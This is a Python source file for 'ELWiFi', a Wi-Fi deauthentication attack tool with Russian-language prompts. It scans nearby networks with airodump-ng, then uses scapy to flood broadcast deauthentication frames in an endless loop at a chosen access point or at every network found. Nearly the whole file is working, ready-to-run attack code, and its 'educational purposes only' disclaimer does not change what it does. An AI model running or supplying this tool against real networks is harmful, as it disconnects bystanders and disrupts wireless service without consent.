import time
import subprocess
import os
from scapy.all import *
from colorama import init, Fore, Style

elwifi_art = f"""{Fore.RED}
███████╗██╗     ██╗    ██╗██╗███████╗██╗
██╔════╝██║     ██║    ██║██║██╔════╝██║
█████╗  ██║     ██║ █╗ ██║██║█████╗  ██║
██╔══╝  ██║     ██║███╗██║██║██╔══╝  ██║
███████╗███████╗╚███╔███╔╝██║██║     ██║
╚══════╝╚══════╝ ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝
{Style.RESET_ALL}"""

info_text = f"""{Fore.YELLOW}Этот инструмент создан только для образовательных целей.{Style.RESET_ALL}
{Fore.RED}Version: 1.0
{Fore.CYAN}Автор не несет ответственности за любое злонамеренное использование программы.
Created by{Fore.YELLOW} Exmanq {Fore.CYAN}(https://github.com/Exmanq){Style.RESET_ALL}"""

init()

print(elwifi_art)
print(info_text)
print("")

def deauth(target_mac, gateway_mac, interface):
    dot11 = Dot11(type=0, subtype=12, addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    try:
        sendp(packet, iface=interface, count=100, inter=0.1, verbose=False)
        print(f"Атака на: {gateway_mac}")
    except Exception as e:
        print(f"Ошибка отправки атаки на: {gateway_mac}: {e}")

def get_networks_info(interface):
    networks = []
    try:
        proc = subprocess.Popen(['airodump-ng', interface, '-w', 'dump', '--output-format', 'csv'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(10)
        proc.terminate()
        time.sleep(1)

        if not os.path.exists('dump-01.csv'):
            raise FileNotFoundError('dump-01.csv не найден. Убедись что адаптер работает нормально.')

        with open('dump-01.csv', 'r') as f:
            lines = f.readlines()
            for line in lines:
                if line.startswith('BSSID'):
                    continue
                parts = line.split(',')
                if len(parts) >= 6:
                    bssid = parts[0].strip()
                    ssid = parts[13].strip()
                    if len(bssid) == 17:
                        networks.append((ssid, bssid))
    except Exception as e:
        print(f" ")
    finally:
        if os.path.exists('dump-01.csv'):
            os.remove('dump-01.csv')
        if os.path.exists('dump-01.cap'):
            os.remove('dump-01.cap')
    return networks

def main():
    interface = input("Введи интерфейс сети: ")
    print(" ")
    print("Идёт сбор информации о ближайших WiFi сетях....")
    
    networks = get_networks_info(interface)
    if not networks:
        print("Не удалось найти доступные сети. Прога завершает свою работу.")
        return

    print(f"{Fore.RED}Wi-Fi Сети которые смог обнаружить ELWiFi поблизости:{Style.RESET_ALL}")
    print(" ")
    for i, (ssid, mac) in enumerate(networks, 1):
        print(f"{i}. Имя сети: {ssid} || MAC адрес WiFi сети: {mac}")
        
    print(" ")
    choice = input("Введите 'all', чтобы атаковать все сети, или выберите номер интересующей сети: ")

    delay = 5
    print(f"Ожидание {delay} секунд перед отправкой пакетов деаутентификации...")
    time.sleep(delay)

    print("Атака начинается")
    try:
        if choice.lower() == 'all':
            while True:
                for ssid, mac in networks:
                    deauth("FF:FF:FF:FF:FF:FF", mac, interface)
                time.sleep(0.5)
        else:
            index = int(choice) - 1
            if 0 <= index < len(networks):
                while True:
                    deauth("FF:FF:FF:FF:FF:FF", networks[index][1], interface)
                    time.sleep(1)
            else:
                print("Неверный ввод")
    except KeyboardInterrupt:
        print("Атака прервана")

if __name__ == "__main__":
    main()
